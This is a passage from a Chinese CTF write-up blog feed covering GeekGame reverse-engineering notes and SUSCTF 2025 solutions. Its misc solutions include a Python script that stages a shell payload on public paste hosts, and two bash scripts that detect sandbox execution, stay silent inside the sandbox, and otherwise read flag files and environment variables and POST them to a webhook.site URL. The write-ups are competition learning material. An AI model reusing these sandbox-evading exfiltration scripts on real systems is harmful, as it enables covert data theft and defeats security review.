hide_tracer.c -ldl</span><br><span class="line">LD_PRELOAD=/home/matriy/RE/TSCTF/hide_tracer.so ./linux_server64</span><br></pre></td></tr></table></figure><p>这里还有个没注意到的点</p><p>test指令并不是跟网上说的那样用来比较的，而是一个位操作的指令</p><p>用于将寄存器 edx 与自身进行按位与操作。这其实是一个快捷方式，用来测试寄存器的内容是否为零</p><p>test 指令的执行结果会影响 CPU 的标志位，特别是 ZF（零标志位）。</p><p>如t</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251025200129278.png" alt="image-20251025200129278"></p><p>若 edx 的值是零，test edx, edx 的结果也会是零，进而设置 ZF 标志。如果 edx 的值不是零，ZF 标志不会被设置。</p><p>jne 0040BCA3 仅在 ZF 未被设置时（即 edx 不为零时）执行跳转。如果 edx 是零，则跳</p><p>简单的来说就是，<strong>当运算的结果值为 0 时，ZF &#x3D; 1</strong></p><p>edx &#x3D; 0 zf &#x3D; 1 不执行跳转(因为zf &#x3D; 1时je跳转 jne不跳)</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;GeekGame-2025-re-wp&quot;&gt;&lt;a href=&quot;#GeekGame-2025-re-wp&quot; class=&quot;headerlink&quot; title=&quot;GeekGame 2025 re wp&quot;&gt;&lt;/a&gt;GeekGame 2025 re wp&lt;/h1&gt;&lt;h2 i</summary>
      
    
    
    
    <category term="CTF wp" scheme="http://matriy330.github.io/categories/CTF-wp/"/>
    
    
    <category term="wp" scheme="http://matriy330.github.io/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>SUSCTF 2025 wp</title>
    <link href="http://matriy330.github.io/519e5256/"/>
    <id>http://matriy330.github.io/519e5256/</id>
    <published>2025-10-18T15:00:00.000Z</published>
    <updated>2025-10-19T11:36:57.655Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SUSCTF-wp"><a href="#SUSCTF-wp" class="headerlink" title="SUSCTF wp"></a>SUSCTF wp</h1><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251006220901737.png" alt="image-20251006220901737"></p><p>那几道逆向不太想复现了</p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="Questionnaire"><a href="#Questionnaire" class="headerlink" title="Questionnaire"></a>Questionnaire</h3><p>问卷</p><h3 id="easyjail"><a href="#easyjail" class="headerlink" title="easyjail"></a>easyjail</h3><p>AI直出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> secrets</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> ssl</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> urllib.error</span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"></span><br><span class="line">PAYLOAD = <span class="string">&quot;env -i PATH=/usr/bin:/bin sh -c &#x27;cat /flag&#x27;\n&quot;</span></span><br><span class="line">PRIMARY_ENDPOINT = <span class="string">&quot;https://0x0.st&quot;</span></span><br><span class="line">TMPFILES_ENDPOINT = <span class="string">&quot;https://tmpfiles.org/api/v1/upload&quot;</span></span><br><span class="line">PASTERS_ENDPOINT = <span class="string">&quot;https://paste.rs&quot;</span></span><br><span class="line">PIPFI_ENDPOINT = <span class="string">&quot;https://p.ip.fi&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_multipart_request</span>(<span class="params">url: <span class="built_in">str</span>, field_name: <span class="built_in">str</span>, filename: <span class="built_in">str</span>, content: <span class="built_in">str</span></span>) -&gt; urllib.request.Request:</span><br><span class="line">    boundary = <span class="string">&quot;----ctf&quot;</span> + secrets.token_hex(<span class="number">8</span>)</span><br><span class="line">    body = []</span><br><span class="line">    body.append(<span class="string">f&quot;--<span class="subst">&#123;boundary&#125;</span>\r\n&quot;</span>.encode())</span><br><span class="line">    body.append(</span><br><span class="line">        <span class="string">f&quot;Content-Disposition: form-data; name=\&quot;<span class="subst">&#123;field_name&#125;</span>\&quot;; filename=\&quot;<span class="subst">&#123;filename&#125;</span>\&quot;\r\n&quot;</span>.encode()</span><br><span class="line">    )</span><br><span class="line">    body.append(<span class="string">b&quot;Content-Type: text/plain\r\n\r\n&quot;</span>)</span><br><span class="line">    body.append(content.encode())</span><br><span class="line">    body.append(<span class="string">b&quot;\r\n&quot;</span>)</span><br><span class="line">    body.append(<span class="string">f&quot;--<span class="subst">&#123;boundary&#125;</span>--\r\n&quot;</span>.encode())</span><br><span class="line">    data = <span class="string">b&quot;&quot;</span>.join(body)</span><br><span class="line">    <span class="keyword">return</span> urllib.request.Request(</span><br><span class="line">        url,</span><br><span class="line">        data=data,</span><br><span class="line">        headers=&#123;</span><br><span class="line">            <span class="string">&quot;Content-Type&quot;</span>: <span class="string">f&quot;multipart/form-data; boundary=<span class="subst">&#123;boundary&#125;</span>&quot;</span>,</span><br><span class="line">            <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;ctf-solver&quot;</span>,</span><br><span class="line">        &#125;,</span><br><span class="line">        method=<span class="string">&quot;POST&quot;</span>,</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_0x0</span>(<span class="params">payload: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    request = _multipart_request(PRIMARY_ENDPOINT, <span class="string">&quot;file&quot;</span>, <span class="string">&quot;p.sh&quot;</span>, payload)</span><br><span class="line">    ctx = ssl.create_default_context()</span><br><span class="line">    <span class="keyword">with</span> urllib.request.urlopen(request, context=ctx, timeout=<span class="number">10</span>) <span class="keyword">as</span> response:</span><br><span class="line">        url = response.read().decode().strip()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> url.startswith(<span class="string">&quot;http&quot;</span>):</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">f&quot;0x0.st 返回异常：<span class="subst">&#123;url!r&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> url</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_tmpfiles</span>(<span class="params">payload: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    request = _multipart_request(TMPFILES_ENDPOINT, <span class="string">&quot;file&quot;</span>, <span class="string">&quot;p.sh&quot;</span>, payload)</span><br><span class="line">    ctx = ssl.create_default_context()</span><br><span class="line">    <span class="keyword">with</span> urllib.request.urlopen(request, context=ctx, timeout=<span class="number">10</span>) <span class="keyword">as</span> response:</span><br><span class="line">        data = response.read().decode().strip()</span><br><span class="line">    parsed = json.loads(data)</span><br><span class="line">    url = parsed[<span class="string">&quot;data&quot;</span>][<span class="string">&quot;url&quot;</span>].replace(<span class="string">&quot;https://tmpfiles.org/&quot;</span>, <span class="string">&quot;https://tmpfiles.org/dl/&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> url.startswith(<span class="string">&quot;http&quot;</span>):</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">f&quot;tmpfiles 返回异常：<span class="subst">&#123;url!r&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> url</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_paste_rs</span>(<span class="params">payload: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    request = urllib.request.Request(</span><br><span class="line">        PASTERS_ENDPOINT,</span><br><span class="line">        data=payload.encode(),</span><br><span class="line">        headers=&#123;<span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;text/plain&quot;</span>, <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;ctf-solver&quot;</span>&#125;,</span><br><span class="line">        method=<span class="string">&quot;POST&quot;</span>,</span><br><span class="line">    )</span><br><span class="line">    ctx = ssl.create_default_context()</span><br><span class="line">    <span class="keyword">with</span> urllib.request.urlopen(request, context=ctx, timeout=<span class="number">10</span>) <span class="keyword">as</span> response:</span><br><span class="line">        url = response.read().decode().strip()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> url.startswith(<span class="string">&quot;http&quot;</span>):</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">f&quot;paste.rs 返回异常：<span class="subst">&#123;url!r&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> url</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_p_ip_fi</span>(<span class="params">payload: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    request = urllib.request.Request(</span><br><span class="line">        PIPFI_ENDPOINT,</span><br><span class="line">        data=payload.encode(),</span><br><span class="line">        headers=&#123;<span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;text/plain&quot;</span>, <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;ctf-solver&quot;</span>&#125;,</span><br><span class="line">        method=<span class="string">&quot;POST&quot;</span>,</span><br><span class="line">    )</span><br><span class="line">    ctx = ssl.create_default_context()</span><br><span class="line">    <span class="keyword">with</span> urllib.request.urlopen(request, context=ctx, timeout=<span class="number">10</span>) <span class="keyword">as</span> response:</span><br><span class="line">        url = response.read().decode().strip()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> url.startswith(<span class="string">&quot;http&quot;</span>):</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">f&quot;p.ip.fi 返回异常：<span class="subst">&#123;url!r&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> url</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">UPLOADERS = [</span><br><span class="line">    (<span class="string">&quot;0x0.st&quot;</span>, upload_0x0),</span><br><span class="line">    (<span class="string">&quot;tmpfiles&quot;</span>, upload_tmpfiles),</span><br><span class="line">    (<span class="string">&quot;paste.rs&quot;</span>, upload_paste_rs),</span><br><span class="line">    (<span class="string">&quot;p.ip.fi&quot;</span>, upload_p_ip_fi),</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_payload</span>(<span class="params">payload: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    last_error: Exception | <span class="literal">None</span> = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">for</span> name, uploader <span class="keyword">in</span> UPLOADERS:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            url = uploader(payload)</span><br><span class="line">        <span class="keyword">except</span> urllib.error.HTTPError <span class="keyword">as</span> err:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[!] <span class="subst">&#123;name&#125;</span> 上传失败：<span class="subst">&#123;err&#125;</span>&quot;</span>)</span><br><span class="line">            last_error = err</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> err:  <span class="comment"># noqa: BLE001</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[!] <span class="subst">&#123;name&#125;</span> 上传异常：<span class="subst">&#123;err&#125;</span>&quot;</span>)</span><br><span class="line">            last_error = err</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] <span class="subst">&#123;name&#125;</span> 上传成功&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> url</span><br><span class="line">    <span class="keyword">raise</span> RuntimeError(<span class="string">f&quot;所有上传方式均失败：<span class="subst">&#123;last_error&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">interact</span>(<span class="params">host: <span class="built_in">str</span>, port: <span class="built_in">int</span>, url: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">with</span> socket.create_connection((host, port), timeout=<span class="number">5</span>) <span class="keyword">as</span> sock:</span><br><span class="line">        sock_file = sock.makefile(<span class="string">&quot;rb&quot;</span>)</span><br><span class="line">        buffer = <span class="string">b&quot;&quot;</span></span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> buffer.endswith(<span class="string">b&quot;: &quot;</span>):</span><br><span class="line">            ch = sock_file.read(<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> ch:</span><br><span class="line">                <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;远端提前关闭连接&quot;</span>)</span><br><span class="line">            buffer += ch</span><br><span class="line">        sys.stdout.write(buffer.decode(errors=<span class="string">&quot;ignore&quot;</span>))</span><br><span class="line">        sys.stdout.flush()</span><br><span class="line"></span><br><span class="line">        sock.sendall(url.encode() + <span class="string">b&quot;\n&quot;</span>)</span><br><span class="line">        remaining = sock_file.read()</span><br><span class="line">        <span class="keyword">return</span> remaining.decode(errors=<span class="string">&quot;ignore&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_flag</span>(<span class="params">output: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> output.splitlines():</span><br><span class="line">        <span class="keyword">if</span> line.startswith(<span class="string">&quot;Script stdout:&quot;</span>):</span><br><span class="line">            <span class="keyword">return</span> line.partition(<span class="string">&quot;:&quot;</span>)[<span class="number">2</span>].strip()</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>() -&gt; <span class="literal">None</span>:</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&quot;SUSCTF misc 远程脚本沙箱解题脚本&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;host&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;题目主机&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;port&quot;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, <span class="built_in">help</span>=<span class="string">&quot;题目端口&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;--payload-url&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;直接指定已上传脚本的 URL&quot;</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    payload_url = args.payload_url <span class="keyword">or</span> upload_payload(PAYLOAD)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] 使用脚本 URL: <span class="subst">&#123;payload_url&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    output = interact(args.host, args.port, payload_url)</span><br><span class="line">    <span class="built_in">print</span>(output)</span><br><span class="line"></span><br><span class="line">    flag = extract_flag(output)</span><br><span class="line">    <span class="keyword">if</span> flag:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] Flag: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[!] 输出中未找到 Flag，请确认脚本实际执行情况&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251005220720914.png" alt="image-20251005220720914"></p><h3 id="curlbash"><a href="#curlbash" class="headerlink" title="curlbash"></a>curlbash</h3><p>用了webhook和gist持久化一个文件链接</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># 用 webhook.site 探测网络：能连=非沙箱；不能=沙箱</span></span><br><span class="line"><span class="built_in">set</span> +e</span><br><span class="line">curl -sI --connect-timeout 2 <span class="string">&quot;https://webhook.site/2427af48-d862-4776-92fb-2fe7e93af250&quot;</span> | grep -q <span class="string">&quot;^HTTP/&quot;</span></span><br><span class="line"><span class="keyword">if</span> [ $? -eq 0 ]; <span class="keyword">then</span></span><br><span class="line">    netok=1</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    netok=0</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="built_in">set</span> -e</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$netok</span> -eq 1 ]; <span class="keyword">then</span></span><br><span class="line">    <span class="comment"># ==== 非沙箱：收集并外带 flag ====</span></span><br><span class="line">    WEBHOOK=<span class="string">&quot;https://webhook.site/2427af48-d862-4776-92fb-2fe7e93af250&quot;</span></span><br><span class="line"></span><br><span class="line">    fl=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> [ -n <span class="string">&quot;<span class="variable">$FLAG</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">        fl=<span class="string">&quot;<span class="variable">$FLAG</span>&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> [ -f /flag ]; <span class="keyword">then</span></span><br><span class="line">        fl=<span class="string">&quot;<span class="subst">$(cat /flag)</span>&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> [ -f /flag.txt ]; <span class="keyword">then</span></span><br><span class="line">        fl=<span class="string">&quot;<span class="subst">$(cat /flag.txt)</span>&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> [ -f /app/flag ]; <span class="keyword">then</span></span><br><span class="line">        fl=<span class="string">&quot;<span class="subst">$(cat /app/flag)</span>&quot;</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        fl=<span class="string">&quot;Flag not found&quot;</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 避免 -e 因网络问题让脚本非0退出</span></span><br><span class="line">    <span class="built_in">set</span> +e</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 方式1：POST 正文（不使用 shell 重定向；用管道把stdin喂给 curl）</span></span><br><span class="line">    <span class="built_in">printf</span> <span class="string">&#x27;%s&#x27;</span> <span class="string">&quot;<span class="variable">$fl</span>&quot;</span> | curl -fsS -X POST --data-binary @- <span class="string">&quot;<span class="variable">$WEBHOOK</span>?type=flag&quot;</span> -o /dev/null</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 方式2：再发一个简短 HEAD/GET 方便在面板里直观看到（依然不做 shell 重定向）</span></span><br><span class="line">    curl -fsS <span class="string">&quot;<span class="variable">$WEBHOOK</span>?ping=1&quot;</span> -o /dev/null</span><br><span class="line"></span><br><span class="line">    <span class="built_in">set</span> -e</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="comment"># ==== 沙箱：保持静默、无副作用 ====</span></span><br><span class="line">    :</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line">s</span><br></pre></td></tr></table></figure><p>非预期出的</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251005232401456.png" alt="image-20251005232401456"></p><h3 id="curlbash-revenge"><a href="#curlbash-revenge" class="headerlink" title="curlbash-revenge"></a>curlbash-revenge</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"># 区分“文件执行”(沙箱轮) vs “stdin 执行”(最终 curl|bash)：</span><br><span class="line"># 在 bash 里，脚本通过文件运行时 $0 是脚本路径；</span><br><span class="line"># 通过 stdin 运行时，$0 通常是 bash/sh（例如 &quot;bash&quot; 或 &quot;-bash&quot;）。</span><br><span class="line"></span><br><span class="line">case &quot;$0&quot; in</span><br><span class="line">  bash|-bash|sh|-sh)</span><br><span class="line">    # ===== 最终轮：通过 stdin 被执行（curl | bash） =====</span><br><span class="line"></span><br><span class="line">    # 收集 flag（尽量覆盖常见位置/变量）</span><br><span class="line">    fl=&quot;&quot;</span><br><span class="line">    if [ -n &quot;$FLAG&quot; ]; then</span><br><span class="line">      fl=&quot;$FLAG&quot;</span><br><span class="line">    elif [ -f /flag ]; then</span><br><span class="line">      fl=&quot;$(cat /flag)&quot;</span><br><span class="line">    elif [ -f /flag.txt ]; then</span><br><span class="line">      fl=&quot;$(cat /flag.txt)&quot;</span><br><span class="line">    elif [ -f /app/flag ]; then</span><br><span class="line">      fl=&quot;$(cat /app/flag)&quot;</span><br><span class="line">    else</span><br><span class="line">      fl=&quot;Flag not found&quot;</span><br><span class="line">    fi</span><br><span class="line"></span><br><span class="line">    # 发到你的 webhook（不用 shell 重定向；网络失败也不让脚本非0退出）</span><br><span class="line">    WEBHOOK=&quot;https://webhook.site/2427af48-d862-4776-92fb-2fe7e93af250&quot;</span><br><span class="line">    printf &#x27;%s&#x27; &quot;$fl&quot; | curl -fsS -X POST --data-binary @- &quot;$WEBHOOK?type=flag&quot; -o /dev/null || :</span><br><span class="line">    curl -fsS &quot;$WEBHOOK?ping=1&quot; -o /dev/null || :</span><br><span class="line">    ;;</span><br><span class="line"></span><br><span class="line">  *)</span><br><span class="line">    # ===== 沙箱轮：脚本从文件运行，保持静默无副作用 =====</span><br><span class="line">    :</span><br><span class="line">    ;;</span><br><span class="line">esac</span><br><span class="line"></span><br><span class="line"># 明确成功退出</span><br><span class="line">exit 0</span><br></pre></td></tr></table></figure><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251005232438914.png" alt="image-20251005232438914"></p><h3 id="eat-mian"><a href="#eat-mian" class="headerlink" title="eat-mian"></a>eat-mian</h3><p>做一下替换然后去在线网站测试下就行</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251006150525926.png" alt="image-20251006150525926"></p><p>susctf{Mag1Cal_P7epr0ces$er_087604c6048d}</p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="03-CrySignin"><a href="#03-CrySignin" class="headerlink" title="03-CrySignin"></a>03-CrySignin</h3><p>GPT</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251005221049585.png" alt="image-20251005221049585"></p><h3 id="04-Broadcast-1"><a href="#04-Broadcast-1" class="headerlink" title="04-Broadcast_1"></a>04-Broadcast_1</h3><p>AI出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span 